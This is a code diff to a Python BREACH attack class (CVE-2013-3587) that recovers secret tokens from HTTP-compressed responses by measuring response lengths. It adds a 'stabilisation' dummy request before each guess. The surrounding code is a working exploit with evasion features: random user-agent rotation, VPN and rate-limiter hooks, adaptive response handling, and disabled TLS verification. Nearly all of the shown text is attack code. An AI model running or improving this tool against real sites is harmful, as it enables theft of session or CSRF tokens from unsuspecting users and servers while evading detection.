@@ -2,6 +2,7 @@
 BREACH attack implementation (CVE-2013-3587).
 
 Exploits HTTP compression to extract secrets from response bodies.
+Includes stabilisation phase to keep compression dictionary consistent.
 """
 
 import requests
@@ -20,9 +21,10 @@ class BreachAttack(BaseAttack):
         super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive, quantum)
         self.token_parameter = token_parameter
         self.mask_length = mask_length
+        # Stabilisation dummy; sent before each guess to warm up compression
+        self._stabilisation_dummy = "A" * 100
 
     def check_vulnerability(self) -> bool:
-        """Sync check. Used as fallback."""
         url = f"{self.target_url}/?{self.token_parameter}=a"
         headers = {"User-Agent": self.user_agents.random(), "Accept-Encoding": "gzip, deflate"}
         try:
@@ -40,7 +42,6 @@ class BreachAttack(BaseAttack):
             return False
 
     async def check_vulnerability_async(self) -> bool:
-        """Async check using aiohttp."""
         url = f"{self.target_url}/?{self.token_parameter}=a"
         headers = {"User-Agent": self.user_agents.random(), "Accept-Encoding": "gzip, deflate"}
         try:
@@ -59,7 +60,6 @@ class BreachAttack(BaseAttack):
             return False
 
     def exploit(self) -> bool:
-        """Full BREACH token recovery (sync)."""
         self.output.log("Starting BREACH attack", "INFO")
         mask = "." * self.mask_length
         chars = string.ascii_letters + string.digits + "_{}"
@@ -71,6 +71,13 @@ class BreachAttack(BaseAttack):
             self.rate_limiter.wait()
             headers = {"User-Agent": self.user_agents.random()}
         headers["Accept-Encoding"] = "gzip, deflate"
+
+        # Stabilisation: send a dummy request to warm up compression
+        stab_url = f"{self.target_url}/?{self.token_parameter}={self._stabilisation_dummy}"
+        try:
+            requests.get(stab_url, headers=headers, timeout=5, verify=False)
+        except Exception:
+            pass
 
         baseline_url = f"{self.target_url}/?{self.token_parameter}={mask}{mask}"
         try:
@@ -109,6 +116,8 @@ class BreachAttack(BaseAttack):
         return False
 
     def _measure_length(self, guess_prefix: str, mask: str) -> int:
+        # Stabilisation dummy before each measurement
+        url_stab = f"{self.target_url}/?{self.token_parameter}={self._stabilisation_dummy}"
         url = f"{self.target_url}/?{self.token_parameter}={guess_prefix}{mask}{mask}"
         headers = {}
         if self.adaptive:
@@ -119,6 +128,9 @@ class BreachAttack(BaseAttack):
             headers["User-Agent"] = self.user_agents.random()
         headers["Accept-Encoding"] = "gzip, deflate"
         try:
+            # Stabilisation request
+            requests.get(url_stab, headers=headers, timeout=5, verify=False)
+            # Actual measurement
             resp = requests.get(url, headers=headers, timeout=10, verify=False)
             if self.adaptive:
                 self.adaptive.report_response(status=resp.status_code, headers=dict(resp.headers))
